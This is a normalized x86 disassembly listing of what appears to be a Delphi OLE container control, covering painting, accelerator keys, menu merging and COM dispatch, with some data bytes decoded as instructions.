push ebp
push sub_47e3d6
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov edx [ ebx + 0x8 ]
call sub_40403c
mov edx esi
mov eax ebx
call sub_449da0
cmp [ ebx + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e3dd
lea eax [ ebp - 0x8 ]
mov edx 0x2
call sub_403fc8
retn
push 0xfffffd42
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
mov eax [ ebx + 0x208 ]
mov eax [ eax + 0x2c ]
test al 0x30
je r-xdata
test al 0x10
je r-xdata
mov edi 0xfffffdfb
mov edi 0xfffffdfa
jmp r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_47e6a0
lea ecx [ ebp - 0x8 ]
mov edx edi
mov eax ebx
call sub_47dd10
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4043b0
jne r-xdata
sub_47e418
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47e4e8
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_449e8c
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e4ef
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
xor eax eax
push ebp
push sub_47e47d
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
call sub_405a08
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov ebx eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4794b8
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_47e482
or ebx 0xffffffff
call sub_403a5c
test ebx ebx
jne r-xdata
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
call sub_4794b8
sub eax 0xfffffd9c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x220 ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e4ef
lea eax [ ebp - 0x8 ]
call sub_405a08
retn
push 0xffffffff
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
sub_47e4f8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x10 ] ebx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47e5da
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x248 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e5e1
lea eax [ ebp - 0x10 ]
call sub_405a08
retn
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x1
xor eax eax
push ebp
push sub_47e5bd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x248 ] 0x0
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x244 ]
mov edx ebx
call sub_41a5d0
mov edi eax
mov edx [ ebp - 0xc ]
mov eax edi
mov ecx [ eax ]
call [ ecx + 0x8 ]
lea edx [ ebp - 0x10 ]
mov eax edi
call sub_47b3f4
mov ecx [ ebp - 0x10 ]
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_47e300
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov eax [ eax + 0x40 ]
mov eax [ eax + ebx * 4 ]
cmp eax [ ebp - 0x8 ]
jne r-xdata
sub_47e5e8
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_40493c
xor eax eax
push ebp
push sub_47e68f
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_47d314
mov [ ebp - 0x10 ] esi
mov eax rw-data
mov [ ebp - 0xc ] eax
mov [ ebp - 0x8 ] 0x1
mov [ ebp - 0x4 ] 0x1
cmp [ esi ] 0x9
je r-xdata
mov eax 0x8
mov eax 0x4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e696
lea eax [ ebp - 0x30 ]
mov edx [ r-xdata ]
call sub_404a0c
retn
lea edx [ ebp - 0x30 ]
call sub_47a004
push 0x0
lea edx [ ebp - 0x30 ]
push edx
push 0x0
lea edx [ ebp - 0x10 ]
push edx
push eax
push 0x0
mov eax [ rw-data ]
push eax
push edi
mov eax [ ebx + 0x224 ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
test eax eax
je r-xdata
sub_47e6a0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov [ ebp - 0x10 ] 0x8
mov eax edi
call sub_404dcc
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_47e6f0
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_47e5e8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e6f7
mov eax [ ebp - 0x8 ]
push eax
call SysFreeString
retn
sub_47e700
push ebx
push esi
push edi
mov ebx edx
mov esi eax
mov eax esi
call sub_461dc8
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebx
retn
test bl bl
je r-xdata
cmp esi [ edi + 0x27c ]
jne r-xdata
mov eax [ edi + 0x27c ]
test eax eax
je r-xdata
xor eax eax
mov [ edi + 0x27c ] eax
mov [ edi + 0x27c ] esi
jmp r-xdata
cmp esi eax
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb02a
call sub_44b16c
sub_47e750
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_47e79e
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
mov edx edi
call sub_413d54
lea ecx [ ebp - 0x10 ]
mov edx esi
mov eax ebx
call sub_47e410
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47e7a5
lea eax [ ebp - 0x10 ]
call sub_40f564
retn
sub_47e7ac
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ecx ]
xor eax eax
push ebp
push sub_47e987
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
add eax 0x25f
cmp eax 0x7
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
jmp [ eax * 4 + jump_table_47e7e1 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov si 0xffeb
call sub_403450
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov si 0xffe9
call sub_403450
jmp r-xdata
cmp [ ecx + 0x8 ] 0x2
jl r-xdata
cmp [ ecx + 0x8 ] 0x0
jle r-xdata
cmp [ ecx + 0x8 ] 0x4
jl r-xdata
lea eax [ ebx + 0x10 ]
call sub_410180
mov [ ebp - 0xe ] ax
mov eax ebx
call sub_410180
mov edi eax
sub esi 0xfffffda4
je r-xdata
mov eax ebx
call sub_410180
mov [ ebp - 0xf ] al
lea edx [ ebp - 0xf ]
mov eax [ ebp - 0x4 ]
mov si 0xffba
call sub_403450
test [ ebx + 0x1 ] 0x40
je r-xdata
lea eax [ ebx + 0x30 ]
call sub_410180
mov edi eax
and edi 0x7
lea eax [ ebx + 0x20 ]
call sub_410180
and eax 0x7
mov [ ebp - 0xc ] eax
mov al [ edi + rw-data ]
mov [ ebp - 0x6 ] al
mov al [ edi + rw-data ]
mov edx [ ebp - 0xc ]
or al [ edx + rw-data ]
mov [ ebp - 0x5 ] al
lea eax [ ebx + 0x10 ]
call sub_410180
mov edi eax
mov eax ebx
call sub_410180
mov [ ebp - 0xc ] eax
sub esi 0xfffffda1
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbb
call sub_403450
sub esi 0x2
jne r-xdata
mov eax [ ebx + 0x8 ]
mov dl [ ebp - 0xf ]
mov [ eax ] dl
jmp r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd3
call sub_403450
dec esi
je r-xdata
mov eax [ ebx + 0x18 ]
mov dx [ ebp - 0xe ]
mov [ eax ] dx
jmp r-xdata
test [ ebx + 0x11 ] 0x40
je r-xdata
and edi 0x7
mov cl [ edi + rw-data ]
lea edx [ ebp - 0xe ]
mov eax [ ebp - 0x4 ]
mov si 0xffbc
call sub_403450
jmp r-xdata
mov eax [ ebp - 0xc ]
push eax
mov ecx edi
mov dl [ ebp - 0x5 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd4
call sub_403450
jmp r-xdata
dec esi
jne r-xdata
push edi
mov eax [ ebp - 0xc ]
push eax
mov cl [ ebp - 0x5 ]
mov dl [ ebp - 0x6 ]
mov eax [ ebp - 0x4 ]
mov si 0xffd5
call sub_403450
jmp r-xdata
sub_47e9a8
push ebx
push esi
add esp 0xffffffe4
mov esi edx
mov ebx eax
mov eax [ esi ]
cmp eax 0xbd00
jb r-xdata
mov eax [ esi ]
sub eax 0xb008
je r-xdata
cmp eax 0xbd08
ja r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
dec eax
je r-xdata
cmp [ ebx + 0x230 ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_44e1b4
cmp [ ebx + 0x220 ] 0x0
je r-xdata
cmp [ ebx + 0x5a ] 0x0
je r-xdata
jmp r-xdata
mov eax ebx
call sub_4507d8
mov [ esp ] eax
mov eax [ esi ]
sub eax 0xbc00
mov [ esp + 0x4 ] eax
mov eax [ esi + 0x4 ]
mov [ esp + 0x8 ] eax
mov eax [ esi + 0x8 ]
mov [ esp + 0xc ] eax
call GetMessageTime
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] 0x115de1f1
mov [ esp + 0x18 ] 0x115de1f1
push esp
mov eax [ ebx + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
test eax eax
jne r-xdata
push 0xfffffd41
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
push 0xfffffd40
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
jmp r-xdata
cmp [ ebx + 0x220 ] 0x0
je r-xdata
mov [ esi + 0xc ] 0x1
jmp r-xdata
push 0xfffffd43
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x14 ]
add esp 0x1c
pop esi
pop ebx
retn
sub_47ea90
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x214 ] 0x0
setne [ ebp - 0x5 ]
xor eax eax
push ebp
push j_sub_403820#3
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_47eb4f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalLock
mov ebx eax
xor eax eax
push ebp
push sub_47eb2c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalSize
mov ecx eax
mov edx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x10 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47eb33
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x214 ]
push eax
call GlobalUnlock
retn
mov eax [ ebp - 0x4 ]
call sub_47d7a4
sub_47eb56
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_47eb65
add [ eax ] eax
add [ eax ] al
sbb al 0x74
inc eax
add [ ecx - 0x15 ] dh
inc edi
add [ ecx - 0x742c743d ] cl
inc ebp
cld
mov ecx [ eax ]
call [ ecx + 0xd8 ]
test al al
jne r-xdata
call sub_403a5c
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
call sub_403a08
sub_47eb98
push esi
mov esi eax
test [ esi + 0x23d ] 0x4
jne r-xdata
mov eax esi
call sub_44ebf4
pop esi
retn
mov eax esi
mov ecx [ eax ]
call [ ecx - 0x10 ]
pop esi
retn
sub_47ebb8
push ebx
push esi
push edi
add esp 0xffffffb0
mov edi edx
mov ebx eax
test [ ebx + 0x23d ] 0x4
je r-xdata
mov edx edi
mov eax ebx
call sub_44e930
mov esi [ edi + 0x4 ]
test esi esi
jne r-xdata
lea edx [ esp + 0x40 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x40 ]
push eax
push esi
push 0x1
mov eax [ ebx + 0x218 ]
push eax
call OleDraw
cmp [ edi + 0x4 ] 0x0
jne r-xdata
push esp
mov eax ebx
call sub_4507d8
push eax
call BeginPaint
mov esi eax
add esp 0x50
pop edi
pop esi
pop ebx
retn
push esp
mov eax ebx
call sub_4507d8
push eax
call EndPaint
jmp r-xdata
sub_47ec28
push ebx
push esi
push edi
push ebp
mov ebp edx
mov esi eax
mov eax esi
call sub_461dc8
mov edi eax
xor ebx ebx
mov eax edi
mov edx [ r-xdata ]
call sub_4033e0
test al al
je r-xdata
test ebx ebx
je r-xdata
mov ebx edi
pop ebp
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x22f ] 0x1
jne r-xdata
mov eax [ ebp + 0x4 ]
push eax
mov eax [ esi + 0x230 ]
push eax
mov eax [ eax ]
call [ eax + 0x1c ]
cmp [ ebp + 0x4 ] 0x0
jne r-xdata
push 0x0
push 0x0
push 0x0
push esi
call sub_47f4c8
sub_47ec84
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44fcd4
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x1
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x249 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_450adc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x1
xor eax eax
push ebp
push sub_47ecfd
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x70 ]
mov edx 0xfffffe0b
mov eax [ ebp - 0x4 ]
call sub_47e2f8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x249 ] 0x0
retn
sub_47ed08
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_44fc8c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x8
je r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24b ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_450adc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x1
xor eax eax
push ebp
push sub_47ed87
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x50 ]
neg al
sbb ecx ecx
mov edx 0xfffffdfe
mov eax [ ebp - 0x4 ]
call sub_47e3e4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24b ] 0x0
retn
sub_47ed94
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_47ee89
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_44fcfc
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x6
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47ee90
lea eax [ ebp - 0x14 ]
call sub_40f564
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x24a ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_450adc
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x1
xor eax eax
push ebp
push sub_47ee6c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x2
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
test [ eax + 0x2c ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
mov ecx [ eax + 0x18 ]
mov edx 0xfffffdff
mov eax [ ebp - 0x4 ]
call sub_47e318
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x24a ] 0x0
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x68 ]
call sub_47cdd4
lea ecx [ ebp - 0x14 ]
mov edx 0xfffffe00
mov eax [ ebp - 0x4 ]
call sub_47e750
sub_47ee94
push ebx
push esi
push edi
add esp 0xffffffd0
mov edi edx
mov ebx eax
mov eax ebx
mov si 0xffb8
call sub_403450
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_44fc1c
mov [ esp + 0x4 ] 0x10
lea eax [ esp + 0x4 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0xc ]
test eax eax
jne r-xdata
cmp [ esp + 0xc ] 0x0
je r-xdata
lea eax [ esp + 0x14 ]
xor ecx ecx
mov edx 0x1c
call sub_402c68
mov eax ebx
call sub_4507d8
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] 0x100
mov eax [ edi + 0x4 ]
mov [ esp + 0x1c ] eax
mov eax [ edi + 0x8 ]
mov [ esp + 0x20 ] eax
push esp
lea eax [ esp + 0x18 ]
push eax
movzx eax [ esp + 0x14 ]
push eax
mov eax [ esp + 0x14 ]
push eax
call IsAccelerator
test eax eax
je r-xdata
lea eax [ esp + 0x14 ]
push eax
mov eax [ ebx + 0x220 ]
push eax
mov eax [ eax ]
call [ eax + 0x10 ]
mov [ edi + 0xc ] 0x1
jmp r-xdata
add esp 0x30
pop edi
pop esi
pop ebx
retn
sub_47ef4c
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_461dc8
test eax eax
je r-xdata
mov edx esp
mov eax ebx
call sub_449958
push esp
mov eax ebx
call sub_4505d4
push eax
push 0x0
mov eax ebx
test eax eax
je r-xdata
cmp ebx [ eax + 0x27c ]
je r-xdata
push eax
push 0x0
push 0xfffffffc
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x2c ]
sub eax 0xfffffd9c
add esp 0x10
pop ebx
retn
sub_47ef9c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_461dc8
mov esi eax
test esi esi
je r-xdata
cmp [ ebx + 0x22c ] 0x0
je r-xdata
cmp ebx [ esi + 0x27c ]
jne r-xdata
test esi esi
je r-xdata
mov eax [ ebx + 0x22c ]
push eax
mov eax [ eax ]
call [ eax + 0x18 ]
pop esi
pop ebx
retn
cmp ebx [ esi + 0x220 ]
jne r-xdata
push 0x0
push ebx
call sub_47f390
sub_47efe4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_403308
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_47f098
push ebp
mov ebp esp
add esp 0xfffffff4
push ebx
push esi
push edi
mov ebx [ ebp + 0x8 ]
lea eax [ ebp - 0xc ]
push eax
push 0x1
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax + 0x48 ]
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0xc ]
push eax
call sub_40651c
mov esi eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x8 ]
push eax
call sub_40651c
mov edi eax
test [ ebx + 0x23d ] 0x4
je r-xdata
push esi
push edi
mov ecx [ ebx + 0x44 ]
mov edx [ ebx + 0x40 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x84 ]
cmp [ ebx + 0x220 ] 0x0
jne r-xdata
cmp esi 0x20
jle r-xdata
cmp edi 0x20
jle r-xdata
mov esi 0x20
mov edi 0x20
sub_47f16c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x10 ]
mov ebx [ ebp + 0xc ]
test [ ebp + 0x14 ] 0x4
je r-xdata
fld [ esi ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_402a24
mov [ ebx ] eax
fld [ esi + 0x4 ]
fmul [ r-xdata ]
mov eax [ rw-data ]
mov eax [ eax ]
fild [ eax + 0x40 ]
fdivp st1
call sub_402a24
mov [ ebx + 0x4 ] eax
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx ]
push eax
call sub_40651c
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi ]
fwait
push 0x9ec
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebx + 0x4 ]
push eax
call sub_40651c
mov [ ebp - 0x4 ] eax
fild [ ebp - 0x4 ]
fstp [ esi + 0x4 ]
fwait
jmp r-xdata
xor eax eax
pop esi
pop ebx
pop ecx
pop ebp
retn 0x10
sub_47f23c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
xor edi edi
mov eax ebx
call sub_4505d4
mov [ esi ] eax
cmp [ esi ] 0x0
jne r-xdata
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
mov edi 0x80004005
sub_47f274
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
lea eax [ ebx + 0x22c ]
call sub_405a08
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
lea eax [ ebx + 0x230 ]
call sub_405a08
push eax
push r-xdata
mov eax [ ebx + 0x218 ]
push eax
mov eax [ eax ]
call [ eax ]
xor eax eax
pop ebx
pop ebp
retn 0x4
sub_47f2ba
add [ eax ] al
adc eax [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
rol [ eax ] 0x0
add [ eax ] al
add [ eax ] al
inc esi
pop ss
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add al al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov dl 0x1
call sub_47e700
xor eax eax
pop ebp
retn 0x4
sub_47f2f0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
xor edx edx
mov [ eax ] edx
mov eax [ ebp + 0xc ]
mov edx ebx
test edx edx
je r-xdata
xor edx edx
mov [ eax ] edx
call sub_405a20
mov eax [ ebp + 0x10 ]
call sub_405a08
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_449958
mov eax [ ebp + 0x14 ]
push esi
lea esi [ ebp - 0x10 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
push 0x7fff
push 0x7fff
push 0x0
push 0x0
mov eax [ ebp + 0x18 ]
push eax
call SetRect
xor eax eax
mov [ esi + 0x4 ] eax
mov eax ebx
call sub_4505ec
mov [ esi + 0x8 ] eax
xor eax eax
mov [ esi + 0xc ] eax
xor eax eax
mov [ esi + 0x10 ] eax
xor eax eax
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x18
sub edx 0xfffffda8
sub_47f390
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push 0x0
push 0x0
push 0x0
push ebx
call sub_47f4c8
xor edx edx
mov eax ebx
call sub_47e700
xor eax eax
pop ebx
pop ebp
retn 0x8
sub_47f488
push ebp
mov ebp esp
add esp 0xfffffff4
mov eax [ ebp + 0x8 ]
call sub_47dbfc
test eax eax
je r-xdata
xor eax eax
mov esp ebp
pop ebp
retn 0xc
push 0x2
mov edx [ ebp + 0x10 ]
push edx
push 0x5
xor edx edx
mov [ ebp - 0xc ] edx
mov [ ebp - 0x8 ] 0x2
mov [ ebp - 0x4 ] 0x4
lea ecx [ ebp - 0xc ]
mov edx [ ebp + 0xc ]
call sub_45e458
sub_47f4c8
push ebp
mov ebp esp
push ebx
mov eax [ ebp + 0x8 ]
call sub_47dbfc
mov ebx eax
xor eax eax
test ebx ebx
je r-xdata
pop ebx
pop ebp
retn 0x10
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_45e4a8
push 0x0
push 0x0
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebx + 0x38 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
call OleSetMenuDescriptor
sub_47f57c
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
mov ebx [ ebp + 0x20 ]
mov esi [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_47f70b
push [ fs : eax ]
mov [ fs : eax ] esp
test [ ebp + 0x18 ] 0x2
je r-xdata
mov edi 0x80020003
test ebx ebx
je r-xdata
xor edi edi
mov eax [ ebp + 0xc ]
add eax 0x2cb
cmp eax 0xe
ja r-xdata
mov edi 0x80020003
jmp sub_47f6ea
jmp [ eax * 4 + jump_table_47f5cc ]
mov eax ebx
jump_table_47f5cc
shl esi cl
inc edi
add al cl
test [ edi ] 0xde
test [ edi ] 0xbd
test [ edi ] 0xb2
test [ edi ] 0xa2
test [ edi ] 0x8f
test [ edi ] 0xde
test [ edi ] 0xde
test [ edi ] 0x84
test [ edi ] 0x72
test [ edi ] 0x61
test [ edi ] 0x33
test [ edi ] 0x19
test [ edi ] 0x8
test [ edi ] 0x8b
retn
sub_47f633
mov eax [ esi + 0x30 ]
test eax eax
je r-xdata
mov esi [ esi + 0x68 ]
cmp [ esi + 0x59 ] 0x0
je r-xdata
mov esi [ eax + 0x68 ]
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov eax esi
call sub_47cdd4
lea edx [ ebp - 0x20 ]
mov eax ebx
call sub_40f878
jmp sub_47f6ea
sub_47f720
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
push edi
xor eax eax
push ebp
push sub_47f924
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push j_sub_403820
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0xc ]
sub eax 0xfffffdfe
